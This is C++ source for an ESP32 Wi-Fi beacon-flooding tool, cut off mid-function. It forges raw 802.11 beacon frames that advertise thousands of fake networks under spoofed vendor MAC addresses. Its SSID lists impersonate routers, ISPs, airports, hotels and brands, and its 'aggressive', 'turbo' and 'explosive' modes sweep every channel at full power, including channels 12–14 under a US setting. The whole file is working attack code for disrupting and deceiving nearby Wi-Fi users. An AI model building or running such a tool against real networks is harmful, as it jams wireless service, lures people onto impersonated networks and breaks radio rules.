#include "beacon.h"
#include <WiFi.h>
#include "esp_wifi.h"
#include "esp_task_wdt.h"
#include "esp_heap_caps.h"
#include "esp_timer.h"
#include <vector>
#include <algorithm>
#include <functional>

using namespace std;

// ---------- GLOBAL VARIABLES ----------
bool beacon_active = false;
bool beacon_paused = false;
bool power_saving = false;
bool turbo_mode = false;
bool directed_attack = false;
bool mimicry_enabled = false;
bool packet_burst_enabled = true;
bool ssid_cache_enabled = true;
bool common_passwords_enabled = true;
bool use_all_channels = true;

uint8_t randomization_level = 100;
uint32_t packets_per_second = 0;
uint32_t max_packets_per_second = 100;
uint16_t packet_interval_ms = 1;
uint8_t focus_channel = 6;
uint8_t channel_bandwidth = WIFI_BW_HT20;

TransmissionMode current_mode = MODE_AGGRESSIVE;
ChannelStrategy current_strategy = STRAT_SWEEP;

// ---------- ADVANCED CONFIGURATION ----------
BeaconConfig config = {
  // SSID Generation
  .num_ssids = 2000,
  .min_ssid_len = 3,
  .max_ssid_len = 32,
  .enable_rsn = true,
  .realistic_ssids = true,
  
  // Transmission Control
  .dwell_ms = 80,
  .tx_per_channel = 8,
  .tx_power = 20,
  
  // Advanced Features
  .enable_vendor_elements = true,
  .enable_performance_stats = true,
  .enable_parallel_transmission = true,
  .enable_directed_broadcast = false,
  
  // Performance Optimization
  .tx_queue_size = 32,
  .wifi_mode = WIFI_MODE_APSTA,
  .disable_wifi_mgmt = true,
  .enable_packet_burst = true,
  
  // Advanced SSID Generation
  .enable_mimicry = true,
  .enable_ssid_cache = true,
  .use_common_passwords = true,
  
  // Channel Control
  .use_all_channels = true,
  .channel_bandwidth = WIFI_BW_HT20,
  
  // Custom SSIDs
  .custom_ssid_list = nullptr,
  .custom_ssid_count = 0
};

// ---------- ADVANCED CHANNEL CONFIG ----------
#ifdef REGION_US
const int CHANNELS[] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 };
const char* COUNTRY_CODE = "US";
#elif defined(REGION_EU)
const int CHANNELS[] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 };
const char* COUNTRY_CODE = "EU";
#elif defined(REGION_CHINA)
const int CHANNELS[] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 };
const char* COUNTRY_CODE = "CN";
#elif defined(REGION_5GHZ)
const int CHANNELS[] = { 36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165 };
const char* COUNTRY_CODE = "US";
#else  // DEFAULT (All 2.4GHz channels)
const int CHANNELS[] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 };
const char* COUNTRY_CODE = "US";
#endif

const int CHANNEL_COUNT = sizeof(CHANNELS) / sizeof(CHANNELS[0]);

// ---------- ADVANCED BUFFERS ----------
uint8_t beaconPacket[BEACON_BUFFER_SIZE];
uint8_t beaconPacket2[BEACON_BUFFER_SIZE];
uint8_t beaconPacket3[BEACON_BUFFER_SIZE];
uint8_t beaconPacket4[BEACON_BUFFER_SIZE];
uint8_t beaconPacket5[BEACON_BUFFER_SIZE];

// ---------- SSID CACHE ----------
vector<String> ssidCache;
vector<array<uint8_t, 6>> macCache;

// ---------- COMMON SSID DATABASE ----------
const char* common_ssids[] = {
  // Router Defaults
  "linksys", "NETGEAR", "dlink", "TP-LINK", "ASUS", "Belkin", "Huawei", "ZTE",
  "MikroTik", "Ubiquiti", "Aruba", "Ruckus", "Meraki", "Cisco", "Juniper",
  
  // Common Network Names
  "Home", "HomeWiFi", "Home Network", "HomeNet", "Family", "MyWiFi", "MyNetwork",
  "Office", "OfficeWiFi", "Corp", "Corporate", "Business", "Work", "Staff",
  "Guest", "GuestWiFi", "Visitor", "Public", "PublicWiFi", "FreeWiFi", "Free",
  "Secure", "SecureWiFi", "Private", "Admin", "Administrator", "Server",
  
  // Location Based
  "Cafe", "Restaurant", "Hotel", "Motel", "Airport", "AirportWiFi", "Station",
  "Train", "Bus", "Metro", "Mall", "Shopping", "Store", "Shop", "Supermarket",
  "Library", "School", "University", "College", "Campus", "Hospital", "Clinic",
  "Gym", "Fitness", "Pool", "Park", "ParkWiFi", "City", "CityWiFi", "Downtown",
  
  // Service Provider
  "ATT", "AT&T", "Verizon", "VerizonWiFi", "TMobile", "T-Mobile", "Sprint",
  "Xfinity", "XfinityWiFi", "Spectrum", "Comcast", "ComcastWiFi", "Cox",
  "CoxWiFi", "Frontier", "CenturyLink", "BT", "BTWiFi", "Vodafone", "O2",
  
  // Tech Companies
  "Google", "GoogleWiFi", "Facebook", "FacebookWiFi", "Microsoft", "Apple",
  "AppleWiFi", "Amazon", "AmazonWiFi", "Tesla", "TeslaWiFi", "Starbucks",
  "StarbucksWiFi", "McDonalds", "McDonaldsWiFi", "BurgerKing", "KFC",
  
  // Generic Patterns
  "WiFi", "WiFi-Free", "WiFi-Public", "WiFi-Guest", "Free Internet",
  "Internet", "Wireless", "Wireless Network", "Network", "Net", "LAN",
  "WLAN", "Hotspot", "Hotspot-Free", "Connect", "Access", "Portal",
  
  // Numeric Patterns
  "WLAN123", "WiFi12345", "Network123", "12345678", "00000000", "11111111",
  "22222222", "33333333", "44444444", "55555555", "66666666", "77777777",
  "88888888", "99999999", "01234567", "98765432", "12341234", "43214321",
  
  // Common Passwords as SSIDs
  "password", "admin", "administrator", "1234", "12345", "123456", "12345678",
  "123456789", "qwerty", "qwertyuiop", "abc123", "password123", "letmein",
  "monkey", "dragon", "baseball", "football", "welcome", "login", "pass",
  "master", "hello", "secret", "test", "testing", "demo", "default",
  
  // International
  "WLAN_FREE", "FREE_WIFI", "PUBLIC_WIFI", "HOTEL_WLAN", "FLUGHAFEN_WLAN",
  "CAFE_WLAN", "RESTAURANT_WIFI", "SHOPPING_WIFI", "STADT_WLAN", "BAHN_WIFI"
};
const int COMMON_SSID_COUNT = sizeof(common_ssids) / sizeof(common_ssids[0]);

// ---------- COMMON PASSWORDS (For Mimicry) ----------
const char* common_passwords[] = {
  "12345678", "password", "123456789", "1234567890", "admin123",
  "00000000", "11111111", "12341234", "12344321", "1234abcd",
  "abcd1234", "qwerty123", "password123", "adminadmin", "welcome123"
};
const int COMMON_PASSWORD_COUNT = sizeof(common_passwords) / sizeof(common_passwords[0]);

// ---------- MAC VENDOR DATABASE ----------
const uint8_t mac_vendors[][3] = {
  {0x00,0x14,0x22}, {0x00,0x1C,0x10}, {0x00,0x1B,0xFC}, {0x00,0x1A,0x70},
  {0x00,0x24,0xB2}, {0x00,0x26,0x5A}, {0x00,0x50,0xF1}, {0x00,0x23,0x12},
  {0x00,0x1D,0x0F}, {0x00,0x0C,0x42}, {0x00,0x12,0x17}, {0x00,0x0E,0x8C},
  {0x00,0x13,0x49}, {0x00,0x18,0x4D}, {0x00,0x17,0x3F}, {0x00,0x0D,0x67},
  {0x00,0x0F,0xB3}, {0x00,0x11,0x85}, {0x00,0x19,0xB9}, {0x00,0x1E,0x8C},
  {0x00,0x21,0x91}, {0x00,0x22,0x5F}, {0x00,0x25,0x86}, {0x00,0x27,0x19},
  {0x00,0x2A,0x6A}, {0x00,0x2C,0xC8}, {0x00,0x30,0xBD}, {0x00,0x34,0xFE},
  {0x00,0x37,0x6D}, {0x00,0x3A,0x99}, {0x00,0x3C,0x10}, {0x00,0x3E,0xE1},
  {0x00,0x40,0x96}, {0x00,0x43,0x85}, {0x00,0x46,0xD2}, {0x00,0x49,0xE7},
  {0x00,0x4C,0x23}, {0x00,0x4F,0x62}, {0x00,0x52,0x18}, {0x00,0x55,0xDA}
};
const int VENDOR_COUNT = sizeof(mac_vendors) / sizeof(mac_vendors[0]);

// ---------- ADVANCED PAYLOADS ----------
const uint8_t rsn_payload[] = {
  0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00,
  0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f,
  0xac, 0x02, 0x00, 0x00
};

const uint8_t wps_element[] = {
  0xDD, 0x1E, 0x00, 0x50, 0xF2, 0x04, 0x10, 0x4A,
  0x00, 0x01, 0x10, 0x10, 0x44, 0x00, 0x01, 0x02,
  0x10, 0x3C, 0x00, 0x01, 0x03, 0x10, 0x47, 0x00,
  0x10, 0x54, 0x65, 0x73, 0x74, 0x69, 0x6E, 0x67
};

const uint8_t wmm_element[] = {
  0xDD, 0x18, 0x00, 0x50, 0xF2, 0x02, 0x01, 0x01,
  0x80, 0x00, 0x03, 0xA4, 0x00, 0x00, 0x27, 0xA4,
  0x00, 0x00, 0x42, 0x43, 0x5E, 0x00, 0x62, 0x32
};

const uint8_t ht_capabilities[] = {
  0x2D, 0x1A, 0xEF, 0x09, 0x1B, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

const uint8_t vht_capabilities[] = {
  0xBF, 0x0C, 0xB2, 0x57, 0xF1, 0xFF, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// ---------- STATISTICS ----------
unsigned long totalPacketsSent = 0;
unsigned long errorCount = 0;
unsigned long channelChanges = 0;
unsigned long lastPacketTime = 0;
unsigned long startTime = 0;
unsigned long packetsInSecond = 0;
unsigned long lastPPSUpdate = 0;
unsigned long lastChannelChange = 0;
unsigned long lastHeapCheck = 0;
unsigned long lastStatPrint = 0;
unsigned long lastSSIDGen = 0;

float averagePPS = 0;
uint8_t currentChannelIndex = 0;

// ---------- ADVANCED SSID GENERATORS ----------
class SSIDGenerator {
private:
  vector<String> generated;
  uint32_t seed;
  
public:
  SSIDGenerator() : seed(esp_random()) {
    randomSeed(seed);
  }
  
  String generateBranded() {
    const char* brands[] = {"NETGEAR", "Linksys", "TP-Link", "ASUS", "dlink", "Cisco", "Belkin", "Huawei"};
    const char* suffixes[] = {"", "-Guest", "-Secure", "-2G", "-5G", "-EXT", "-AP", "-Router"};
    
    String ssid = brands[random(0, 8)];
    ssid += suffixes[random(0, 8)];
    if (random(0, 100) < 60) {
      ssid += "-";
      ssid += String(random(10, 10000));
    }
    return ssid;
  }
  
  String generateLocationBased() {
    const char* locations[] = {"Home", "Office", "Cafe", "Hotel", "Airport", "Mall", "School", "Hospital"};
    const char* types[] = {"WiFi", "Network", "WLAN", "Internet", "Free", "Guest", "Public", "Secure"};
    
    String ssid = locations[random(0, 8)];
    ssid += "_";
    ssid += types[random(0, 8)];
    if (random(0, 100) < 40) {
      ssid += "_";
      ssid += String(random(1, 10));
    }
    return ssid;
  }
  
  String generateTechStyle() {
    const char* prefixes[] = {"WLAN", "AP", "ROUTER", "SWITCH", "GATEWAY", "BRIDGE", "REPEATER", "MESH"};
    String ssid = prefixes[random(0, 8)];
    ssid += "-";
    ssid += String(random(1000, 9999), HEX);
    ssid.toUpperCase();
    return ssid;
  }
  
  String generateCommon() {
    if (common_passwords_enabled && random(0, 100) < 30) {
      return String(common_passwords[random(0, COMMON_PASSWORD_COUNT)]);
    }
    return String(common_ssids[random(0, COMMON_SSID_COUNT)]);
  }
  
  String generateRandom(int min_len, int max_len) {
    int len = random(min_len, max_len + 1);
    String ssid;
    const char* chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-@#!";
    
    for (int i = 0; i < len; i++) {
      ssid += chars[random(0, strlen(chars))];
    }
    return ssid;
  }
};

SSIDGenerator ssidGen;

// ---------- PRIVATE FUNCTION DECLARATIONS ----------
void generateRealisticSSID(char* buf, int index);
void generateRandomSSID(char* buf);
void getSSID(int index, char* buffer);
void generateRandomMAC(uint8_t mac[6], int ssid_index);
void addVendorElements(int* pos, uint8_t* buffer);
int buildBeaconPacket(const char* ssid, const uint8_t mac[6], uint8_t channel, uint8_t* buffer);
void pregenerateSSIDs();
unsigned long getDwellTime();
void checkHeap();
void feedWatchdog();
void updateStatistics();
bool validateConfig();
void cleanupMemory();
void printHeapInfo();
void optimizeWiFiSettings();
void updatePPS();
void aggressiveTransmission();
void stealthTransmission();
void normalTransmission();
void turboTransmission();
void explosiveTransmission();
void sendMultiplePackets(uint8_t channel, int count);
void sendPacketBurst(uint8_t channel, int burst_size);
void changeChannel();
void setWiFiSettings();
void initializeWiFi();
void generateSSIDCache();
void printRealTimeStats();
void handleModeChange();
void manageMemory();
void setupWatchdog();
void logError(esp_err_t error, const char* context);

// Helper functions for min/max with different types
template<typename T, typename U>
T minValue(T a, U b) {
  return (a < (T)b) ? a : (T)b;
}

template<typename T, typename U>
T maxValue(T a, U b) {
  return (a > (T)b) ? a : (T)b;
}

// ---------- CONFIGURATION MANAGEMENT ----------
void setBeaconConfig(const BeaconConfig& newConfig) {
  // Stop beacon if running
  bool wasActive = beacon_active;
  if (wasActive) {
    beacon_active = false;
    delay(50);
  }
  
  BeaconConfig tempConfig = newConfig;
  
  // Enhanced validation with constraints
  tempConfig.num_ssids = tempConfig.num_ssids > 65535 ? 65535 : tempConfig.num_ssids;
  tempConfig.num_ssids = tempConfig.num_ssids < 1 ? 1 : tempConfig.num_ssids;
  
  tempConfig.min_ssid_len = tempConfig.min_ssid_len < 1 ? 1 : tempConfig.min_ssid_len;
  tempConfig.max_ssid_len = tempConfig.max_ssid_len > 32 ? 32 : tempConfig.max_ssid_len;
  if (tempConfig.min_ssid_len > tempConfig.max_ssid_len) {
    tempConfig.min_ssid_len = tempConfig.max_ssid_len;
  }
  
  tempConfig.tx_power = tempConfig.tx_power > 20 ? 20 : tempConfig.tx_power;
  tempConfig.tx_power = tempConfig.tx_power < 1 ? 1 : tempConfig.tx_power;
  
  tempConfig.dwell_ms = tempConfig.dwell_ms > 10000 ? 10000 : tempConfig.dwell_ms;
  tempConfig.dwell_ms = tempConfig.dwell_ms < 10 ? 10 : tempConfig.dwell_ms;
  
  tempConfig.tx_per_channel = tempConfig.tx_per_channel > 50 ? 50 : tempConfig.tx_per_channel;
  tempConfig.tx_per_channel = tempConfig.tx_per_channel < 1 ? 1 : tempConfig.tx_per_channel;
  
  tempConfig.tx_queue_size = tempConfig.tx_queue_size > 64 ? 64 : tempConfig.tx_queue_size;
  tempConfig.tx_queue_size = tempConfig.tx_queue_size < 1 ? 1 : tempConfig.tx_queue_size;
  
  config = tempConfig;
  
  // Regenerate cache if needed
  if (config.enable_ssid_cache && (ssidCache.size() != config.num_ssids)) {
    generateSSIDCache();
  }
  
  // Apply new settings
  setWiFiSettings();
  
  Serial.println("\n[CONFIG] Configuration updated successfully");
  Serial.printf("[CONFIG] SSIDs: %d, TX Power: %ddBm, Dwell: %dms\n", 
                config.num_ssids, config.tx_power, config.dwell_ms);
  
  // Restart if was active
  if (wasActive) {
    beacon_active = true;
    Serial.println("[CONFIG] Beacon reactivated with new settings");
  }
}

BeaconConfig getBeaconConfig() {
  return config;
}

void resetConfigToDefaults() {
  BeaconConfig defaults = {
    .num_ssids = 20000,
    .min_ssid_len = 3,
    .max_ssid_len = 32,
    .enable_rsn = true,
    .realistic_ssids = true,
    .dwell_ms = 80,
    .tx_per_channel = 8,
    .tx_power = 20,
    .enable_vendor_elements = true,
    .enable_performance_stats = true,
    .enable_parallel_transmission = true,
    .enable_directed_broadcast = false,
    .tx_queue_size = 32,
    .wifi_mode = WIFI_MODE_APSTA,
    .disable_wifi_mgmt = true,
    .enable_packet_burst = true,
    .enable_mimicry = true,
    .enable_ssid_cache = true,
    .use_common_passwords = true,
    .use_all_channels = true,
    .channel_bandwidth = WIFI_BW_HT20,
    .custom_ssid_list = nullptr,
    .custom_ssid_count = 0
  };
  setBeaconConfig(defaults);
  Serial.println("[CONFIG] Reset to factory defaults");
}

void loadCustomSSIDs(const char** ssids, int count) {
  if (count > MAX_CUSTOM_SSIDS) {
    Serial.printf("[WARN] Too many SSIDs (%d), limiting to %d\n", count, MAX_CUSTOM_SSIDS);
    count = MAX_CUSTOM_SSIDS;
  }
  
  ssidCache.clear();
  for (int i = 0; i < count; i++) {
    ssidCache.push_back(String(ssids[i]));
  }
  
  config.realistic_ssids = false;
  config.enable_ssid_cache = true;
  
  Serial.printf("[CACHE] Loaded %d custom SSIDs into cache\n", count);
}

void setWiFiMode(uint8_t mode) {
  config.wifi_mode = mode;
  Serial.printf("[WIFI] Mode set to: %d\n", mode);
}

void setTxPower(uint8_t power) {
  config.tx_power = power > 20 ? 20 : power;
  esp_wifi_set_max_tx_power(config.tx_power * 4);
  Serial.printf("[POWER] TX power set to %ddBm\n", config.tx_power);
}

void setChannelBandwidth(uint8_t bandwidth) {
  config.channel_bandwidth = bandwidth;
  esp_wifi_set_bandwidth(WIFI_IF_AP, (wifi_bandwidth_t)bandwidth);
  Serial.printf("[BANDWIDTH] Set to %s\n", 
                bandwidth == WIFI_BW_HT20 ? "20MHz" : 
                bandwidth == WIFI_BW_HT40 ? "40MHz" : "Unknown");
}

// ---------- STATUS FUNCTIONS ----------
bool isBeaconActive() {
  return beacon_active;
}

bool isBeaconPaused() {
  return beacon_paused;
}

unsigned long getTotalPacketsSent() {
  return totalPacketsSent;
}

unsigned long getErrorCount() {
  return errorCount;
}

float getPacketsPerSecond() {
  return packets_per_second;
}

void printStatistics() {
  unsigned long runtime = millis() - startTime;
  float avgPPS = (runtime > 0) ? (totalPacketsSent * 1000.0 / runtime) : 0;
  float errorRate = totalPacketsSent > 0 ? (errorCount * 100.0 / totalPacketsSent) : 0;
  
  Serial.println("\n════════════════════════════════════════════════");
  Serial.println("           ADVANCED BEACON STATISTICS");
  Serial.println("════════════════════════════════════════════════");
  Serial.printf("  Runtime:           %lu seconds\n", runtime / 1000);
  Serial.printf("  Total Packets:     %lu\n", totalPacketsSent);
  Serial.printf("  Current PPS:       %lu packets/sec\n", packets_per_second);
  Serial.printf("  Average PPS:       %.1f packets/sec\n", avgPPS);
  Serial.printf("  Errors:            %lu (%.2f%%)\n", errorCount, errorRate);
  Serial.printf("  Channel Changes:   %lu\n", channelChanges);
  Serial.printf("  SSID Cache:        %d entries\n", (int)ssidCache.size());
  Serial.printf("  Current Mode:      %d\n", current_mode);
  Serial.printf("  Channel Strategy:  %d\n", current_strategy);
  Serial.printf("  TX Power:          %ddBm\n", config.tx_power);
  Serial.println("════════════════════════════════════════════════\n");
}

void printHeapStatus() {
  printHeapInfo();
}

void printSystemStatus() {
  Serial.println("\n════════════════════════════════════════════════");
  Serial.println("               SYSTEM STATUS");
  Serial.println("════════════════════════════════════════════════");
  Serial.printf("  Free Heap:         %d bytes\n", ESP.getFreeHeap());
  Serial.printf("  Min Free Heap:     %d bytes\n", ESP.getMinFreeHeap());
  Serial.printf("  Max Alloc Heap:    %d bytes\n", ESP.getMaxAllocHeap());
  Serial.printf("  PSRAM Size:        %d bytes\n", ESP.getPsramSize());
  Serial.printf("  Free PSRAM:        %d bytes\n", ESP.getFreePsram());
  Serial.printf("  CPU Frequency:     %d MHz\n", getCpuFrequencyMhz());
  Serial.printf("  SDK Version:       %s\n", ESP.getSdkVersion());
  Serial.println("════════════════════════════════════════════════\n");
}

void printChannelInfo() {
  Serial.println("\n════════════════════════════════════════════════");
  Serial.println("               CHANNEL INFORMATION");
  Serial.println("════════════════════════════════════════════════");
  Serial.printf("  Total Channels:    %d\n", CHANNEL_COUNT);
  Serial.printf("  Current Channel:   %d\n", CHANNELS[currentChannelIndex]);
  Serial.printf("  Bandwidth:         %s\n", 
                config.channel_bandwidth == WIFI_BW_HT20 ? "20MHz" : 
                config.channel_bandwidth == WIFI_BW_HT40 ? "40MHz" : "Unknown");
  Serial.printf("  Country Code:      %s\n", COUNTRY_CODE);
  Serial.println("  Available Channels:");
  
  for (int i = 0; i < CHANNEL_COUNT; i++) {
    Serial.printf("    %2d", CHANNELS[i]);
    if ((i + 1) % 7 == 0) Serial.println();
  }
  Serial.println("\n════════════════════════════════════════════════\n");
}

void printSSIDCacheStatus() {
  Serial.println("\n════════════════════════════════════════════════");
  Serial.println("               SSID CACHE STATUS");
  Serial.println("════════════════════════════════════════════════");
  Serial.printf("  Cache Size:        %d SSIDs\n", (int)ssidCache.size());
  Serial.printf("  Cache Enabled:     %s\n", config.enable_ssid_cache ? "Yes" : "No");
  Serial.printf("  Max Cache Size:    %d\n", MAX_SSID_CACHE);
  Serial.println("  Sample SSIDs:");
  
  int sampleCount = minValue((int)ssidCache.size(), 10);
  for (int i = 0; i < sampleCount; i++) {
    Serial.printf("    %2d. %s\n", i + 1, ssidCache[i].c_str());
  }
  Serial.println("════════════════════════════════════════════════\n");
}

// ---------- PERFORMANCE FUNCTIONS ----------
void setChannelStrategy(ChannelStrategy strategy) {
  current_strategy = strategy;
  const char* strategies[] = {"Hopping", "Focused", "Sweep", "Random"};
  Serial.printf("[MODE] Channel strategy set to: %s\n", strategies[strategy]);
}

void setTransmissionMode(TransmissionMode mode) {
  current_mode = mode;
  const char* modes[] = {"Normal", "Aggressive", "Stealth", "Turbo", "Explosive"};
  Serial.printf("[MODE] Transmission mode set to: %s\n", modes[mode]);
  handleModeChange();
}

void setPowerSaving(bool enable) {
  power_saving = enable;
  if (enable) {
    config.tx_power = 8;
    config.tx_per_channel = 2;
    config.dwell_ms = 400;
    current_mode = MODE_NORMAL;
  }
  Serial.printf("[POWER] Power saving mode %s\n", enable ? "enabled" : "disabled");
}

void setRandomizationLevel(uint8_t level) {
  randomization_level = level > 100 ? 100 : level;
  Serial.printf("[RAND] Randomization level set to %u%%\n", randomization_level);
}

void setTurboMode(bool enable) {
  turbo_mode = enable;
  if (enable) {
    config.tx_per_channel = 15;
    config.dwell_ms = 30;
    config.tx_queue_size = 48;
    current_mode = MODE_TURBO;
  }
  Serial.printf("[TURBO] Turbo mode %s\n", enable ? "enabled" : "disabled");
}

void setFocusChannel(uint8_t channel) {
  focus_channel = channel > 14 ? 14 : channel;
  focus_channel = channel < 1 ? 1 : channel;
  current_strategy = STRAT_FOCUSED;
  Serial.printf("[CHANNEL] Focused on channel %d\n", focus_channel);
}

void setPacketInterval(uint16_t interval_ms) {
  packet_interval_ms = interval_ms > 1000 ? 1000 : interval_ms;
  packet_interval_ms = interval_ms < 1 ? 1 : interval_ms;
  Serial.printf("[INTERVAL] Packet interval set to %dms\n", packet_interval_ms);
}

void setMaxPacketsPerSecond(uint32_t max_pps) {
  max_packets_per_second = max_pps;
  Serial.printf("[PPS] Maximum PPS set to %lu\n", max_packets_per_second);
}

void setChannelDwellTime(uint16_t dwell_ms) {
  config.dwell_ms = dwell_ms > 10000 ? 10000 : dwell_ms;
  config.dwell_ms = dwell_ms < 10 ? 10 : dwell_ms;
  Serial.printf("[DWELL] Channel dwell time set to %dms\n", config.dwell_ms);
}

// ---------- ADVANCED FEATURES ----------
void enableSSIDMimicry(bool enable) {
  mimicry_enabled = enable;
  config.enable_mimicry = enable;
  Serial.printf("[MIMICRY] SSID mimicry %s\n", enable ? "enabled" : "disabled");
}

void enablePacketBurst(bool enable) {
  packet_burst_enabled = enable;
  config.enable_packet_burst = enable;
  Serial.printf("[BURST] Packet burst %s\n", enable ? "enabled" : "disabled");
}

void enableSSIDCache(bool enable) {
  ssid_cache_enabled = enable;
  config.enable_ssid_cache = enable;
  if (enable && ssidCache.empty()) {
    generateSSIDCache();
  }
  Serial.printf("[CACHE] SSID cache %s\n", enable ? "enabled" : "disabled");
}

void enableCommonPasswords(bool enable) {
  common_passwords_enabled = enable;
  config.use_common_passwords = enable;
  Serial.printf("[PASS] Common passwords %s\n", enable ? "enabled" : "disabled");
}

// ---------- PRIVATE FUNCTIONS ----------
void generateRealisticSSID(char* buf, int index) {
  if (config.custom_ssid_list != nullptr && config.custom_ssid_count > 0 && index < config.custom_ssid_count) {
    strncpy(buf, config.custom_ssid_list[index], MAX_SSID_LENGTH);
    buf[MAX_SSID_LENGTH] = '\0';
    return;
  }
  
  String ssid;
  int type = random(0, 100);
  
  if (type < 20) {
    ssid = ssidGen.generateBranded();
  } else if (type < 40) {
    ssid = ssidGen.generateLocationBased();
  } else if (type < 60) {
    ssid = ssidGen.generateTechStyle();
  } else if (type < 80) {
    ssid = ssidGen.generateCommon();
  } else {
    ssid = ssidGen.generateRandom(config.min_ssid_len, config.max_ssid_len);
  }
  
  strncpy(buf, ssid.c_str(), MAX_SSID_LENGTH);
  buf[MAX_SSID_LENGTH] = '\0';
}

void generateRandomSSID(char* buf) {
  String ssid = ssidGen.generateRandom(config.min_ssid_len, config.max_ssid_len);
  strncpy(buf, ssid.c_str(), MAX_SSID_LENGTH);
  buf[MAX_SSID_LENGTH] = '\0';
}

void getSSID(int index, char* buffer) {
  if (config.enable_ssid_cache && index < (int)ssidCache.size()) {
    strcpy(buffer, ssidCache[index].c_str());
  } else {
    if (config.realistic_ssids) {
      generateRealisticSSID(buffer, index);
    } else {
      generateRandomSSID(buffer);
    }
  }
}

void generateRandomMAC(uint8_t mac[6], int ssid_index) {
  if (ssid_index < (int)macCache.size()) {
    memcpy(mac, macCache[ssid_index].data(), 6);
    return;
  }
  
  if (random(0, 100) < randomization_level) {
    const uint8_t* vendor = mac_vendors[random(0, VENDOR_COUNT)];
    mac[0] = vendor[0];
    mac[1] = vendor[1];
    mac[2] = vendor[2];
  } else {
    mac[0] = 0x02;  // Locally administered
    mac[1] = random(0, 256);
    mac[2] = random(0, 256);
  }
  
  mac[3] = (esp_random() + ssid_index) & 0xFF;
  mac[4] = (esp_random() >> 8) & 0xFF;
  mac[5] = (esp_random() >> 16) & 0xFF;
}

void addVendorElements(int* pos, uint8_t* buffer) {
  if (!config.enable_vendor_elements) return;
  
  if (random(0, 100) < 40) {
    memcpy(&buffer[*pos], wps_element, sizeof(wps_element));
    *pos += sizeof(wps_element);
  }
  
  if (random(0, 100) < 30) {
    memcpy(&buffer[*pos], wmm_element, sizeof(wmm_element));
    *pos += sizeof(wmm_element);
  }
  
  if (random(0, 100) < 20) {
    memcpy(&buffer[*pos], ht_capabilities, sizeof(ht_capabilities));
    *pos += sizeof(ht_capabilities);
  }
  
  if (random(0, 100) < 10) {
    memcpy(&buffer[*pos], vht_capabilities, sizeof(vht_capabilities));
    *pos += sizeof(vht_capabilities);
  }
}

int buildBeaconPacket(const char* ssid, const uint8_t mac[6], uint8_t channel, uint8_t* buffer) {
  int pos = 0;
  int ssidLen = strlen(ssid);
  
  // 802.11 beacon frame
  buffer[pos++] = 0x80;  // Type/Subtype: Beacon
  buffer[pos++] = 0x00;
  buffer[pos++] = 0x00;
  buffer[pos++] = 0x00;
  
  // Destination address (broadcast)
  memset(&buffer[pos], 0xFF, 6);
  pos += 6;
  
  // Source address (BSSID)
  memcpy(&buffer[pos], mac, 6);
  pos += 6;
  
  // BSSID
  memcpy(&buffer[pos], mac, 6);
  pos += 6;
  
  // Sequence control
  uint16_t seq = random(0, 0xFFF);
  buffer[pos++] = seq & 0xff;
  buffer[pos++] = (seq >> 8) & 0xff;
  
  // Timestamp
  uint64_t timestamp = esp_timer_get_time();
  for (int i = 0; i < 8; i++) {
    buffer[pos++] = (timestamp >> (i * 8)) & 0xFF;
  }
  
  // Beacon interval
  buffer[pos++] = 0x64;
  buffer[pos++] = 0x00;
  
  // Capability info
  buffer[pos++] = config.enable_rsn ? 0x31 : 0x21;
  buffer[pos++] = 0x04;
  
  // SSID element
  buffer[pos++] = 0x00;
  buffer[pos++] = ssidLen;
  memcpy(&buffer[pos], ssid, ssidLen);
  pos += ssidLen;
  
  // Supported Rates
  const uint8_t supRates[] = { 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c };
  buffer[pos++] = 0x01;
  buffer[pos++] = sizeof(supRates);
  memcpy(&buffer[pos], supRates, sizeof(supRates));
  pos += sizeof(supRates);
  
  // Channel
  buffer[pos++] = 0x03;
  buffer[pos++] = 0x01;
  buffer[pos++] = channel;
  
  // RSN (optional)
  if (config.enable_rsn) {
    buffer[pos++] = 0x30;
    buffer[pos++] = sizeof(rsn_payload);
    memcpy(&buffer[pos], rsn_payload, sizeof(rsn_payload));
    pos += sizeof(rsn_payload);
  }
  
  // Vendor elements
  addVendorElements(&pos, buffer);
  
  return pos;
}

void generateSSIDCache() {
  if (!config.enable_ssid_cache) return;
  
  ssidCache.clear();
  macCache.clear();
  
  int targetSize = minValue((int)config.num_ssids, (int)MAX_SSID_CACHE);
  
  Serial.printf("[CACHE] Generating %d SSIDs and MACs...\n", targetSize);
  
  for (int i = 0; i < targetSize; i++) {
    char ssid[MAX_SSID_LENGTH + 1];
    getSSID(i, ssid);
    ssidCache.push_back(String(ssid));
    
    array<uint8_t, 6> mac;
    generateRandomMAC(mac.data(), i);
    macCache.push_back(mac);
    
    if (i % 1000 == 0 && i > 0) {
      Serial.printf("[CACHE] Generated %d/%d\n", i, targetSize);
      feedWatchdog();
    }
  }
  
  Serial.printf("[CACHE] Cache generation complete: %d entries\n", (int)ssidCache.size());
}

unsigned long getDwellTime() {
  switch (current_mode) {
    case MODE_NORMAL: return config.dwell_ms;
    case MODE_AGGRESSIVE: return config.dwell_ms / 2;
    case MODE_STEALTH: return config.dwell_ms * 2;
    case MODE_TURBO: return config.dwell_ms / 4;
    case MODE_EXPLOSIVE: return config.dwell_ms / 8;
    default: return config.dwell_ms;
  }
}

void checkHeap() {
  static unsigned long lastCheck = 0;
  unsigned long now = millis();
  
  if (now - lastCheck > 2000) {
    int freeHeap = ESP.getFreeHeap();
    int minFree = ESP.getMinFreeHeap();
    
    if (freeHeap < 8000) {
      Serial.printf("[HEAP] WARNING: Low heap - Free: %d, Min: %d\n", freeHeap, minFree);
      if (freeHeap < 4000) {
        Serial.println("[HEAP] CRITICAL: Performing memory cleanup");
        cleanupMemory();
